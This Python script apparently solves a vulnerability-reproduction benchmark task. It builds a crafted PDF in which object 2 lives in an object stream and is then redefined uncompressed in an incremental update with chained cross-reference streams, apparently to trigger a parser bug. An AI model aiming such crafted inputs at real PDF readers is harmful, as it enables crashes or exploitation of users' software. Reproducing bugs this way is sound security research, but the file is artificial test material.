import io
import os
import zlib


def _be(n: int, width: int) -> bytes:
    return int(n).to_bytes(width, "big", signed=False)


def _make_indirect_object(objnum: int, body: bytes) -> bytes:
    return (f"{objnum} 0 obj\n".encode("ascii") + body + b"\nendobj\n")


def _make_stream_object(objnum: int, dict_bytes: bytes, stream_data: bytes) -> bytes:
    out = io.BytesIO()
    out.write(f"{objnum} 0 obj\n".encode("ascii"))
    out.write(dict_bytes)
    out.write(b"\nstream\n")
    out.write(stream_data)
    out.write(b"\nendstream\nendobj\n")
    return out.getvalue()


def _make_flate_stream_dict(extra_kv: str, length: int) -> bytes:
    s = f"<< {extra_kv} /Length {length} /Filter /FlateDecode >>"
    return s.encode("ascii")


def _make_plain_stream_dict(extra_kv: str, length: int) -> bytes:
    s = f"<< {extra_kv} /Length {length} >>"
    return s.encode("ascii")


def _xref_stream_data(entries, W=(1, 4, 2)) -> bytes:
    w0, w1, w2 = W
    out = bytearray()
    for t, f2, f3 in entries:
        out += _be(t, w0)
        out += _be(f2, w1)
        out += _be(f3, w2)
    return bytes(out)


def _build_pdf_poc() -> bytes:
    header = b"%PDF-1.5\n%\xff\xff\xff\xff\n"
    parts = [header]

    offsets = {}

    # 1 0 obj: Catalog (points to Pages 2 0 R; will be updated to uncompressed in incremental update)
    obj1_body = b"<< /Type /Catalog /Pages 2 0 R >>"
    offsets[1] = sum(len(p) for p in parts)
    parts.append(_make_indirect_object(1, obj1_body))

    # 4 0 obj: content stream
    content = b"q\n0 0 200 200 re\nW\nn\nQ\n"
    obj4 = _make_stream_object(4, _make_plain_stream_dict("", len(content)), content)
    offsets[4] = sum(len(p) for p in parts)
    parts.append(obj4)

    # 5 0 obj: object stream containing old 2 0 and 3 0 (3 0 is still referenced, so stream will be parsed)
    old_pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 /Old true >>"
    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << >> >>"
    # ObjStm header: objnum offset pairs
    # N=2, first object offset=0, second offset=len(old_pages)+1 (separator newline)
    objstm_header = f"2 0 3 {len(old_pages) + 1}\n".encode("ascii")
    objstm_decoded = objstm_header + old_pages + b"\n" + page + b"\n"
    objstm_first = len(objstm_header)
    objstm_encoded = zlib.compress(objstm_decoded, 9)
    obj5_dict = _make_flate_stream_dict(f"/Type /ObjStm /N 2 /First {objstm_first}", len(objstm_encoded))
    obj5 = _make_stream_object(5, obj5_dict, objstm_encoded)
    offsets[5] = sum(len(p) for p in parts)
    parts.append(obj5)

    # 6 0 obj: first xref stream
    offsets[6] = sum(len(p) for p in parts)
    size1 = 7  # objects 0..6
    # entries for 0..6
    entries1 = [
        (0, 0, 65535),                 # 0 free
        (1, offsets[1], 0),            # 1
        (2, 5, 0),                     # 2 in objstm 5 idx 0
        (2, 5, 1),                     # 3 in objstm 5 idx 1
        (1, offsets[4], 0),            # 4
        (1, offsets[5], 0),            # 5
        (1, offsets[6], 0),            # 6 (xref stream itself)
    ]
    xref1_decoded = _xref_stream_data(entries1, W=(1, 4, 2))
    xref1_encoded = zlib.compress(xref1_decoded, 9)
    xref1_dict = _make_flate_stream_dict(
        f"/Type /XRef /Size {size1} /Root 1 0 R /W [1 4 2] /Index [0 {size1}]",
        len(xref1_encoded),
    )
    obj6 = _make_stream_object(6, xref1_dict, xref1_encoded)
    parts.append(obj6)

    startxref1 = offsets[6]
    parts.append(b"startxref\n" + str(startxref1).encode("ascii") + b"\n%%EOF\n")

    # Incremental update: redefine object 2 uncompressed (newest xref entry)
    offsets[2] = sum(len(p) for p in parts)
    new_pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 /New true >>"
    parts.append(_make_indirect_object(2, new_pages))

    # 7 0 obj: second xref stream
    offsets[7] = sum(len(p) for p in parts)
    size2 = 8  # objects 0..7
    # /Index [0 1 2 1 7 1]: entries for obj 0, obj 2, obj 7
    entries2 = [
        (0, 0, 65535),           # 0
        (1, offsets[2], 0),      # 2 updated, uncompressed
        (1, offsets[7], 0),      # 7 (xref stream itself)
    ]
    xref2_decoded = _xref_stream_data(entries2, W=(1, 4, 2))
    xref2_encoded = zlib.compress(xref2_decoded, 9)
    xref2_dict = _make_flate_stream_dict(
        f"/Type /XRef /Size {size2} /Root 1 0 R /Prev {startxref1} /W [1 4 2] /Index [0 1 2 1 7 1]",
        len(xref2_encoded),
    )
    obj7 = _make_stream_object(7, xref2_dict, xref2_encoded)
    parts.append(obj7)

    startxref2 = offsets[7]
    parts.append(b"startxref\n" + str(startxref2).encode("ascii") + b"\n%%EOF\n")

    return b"".join(parts)


class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = src_path
        return _build_pdf_poc()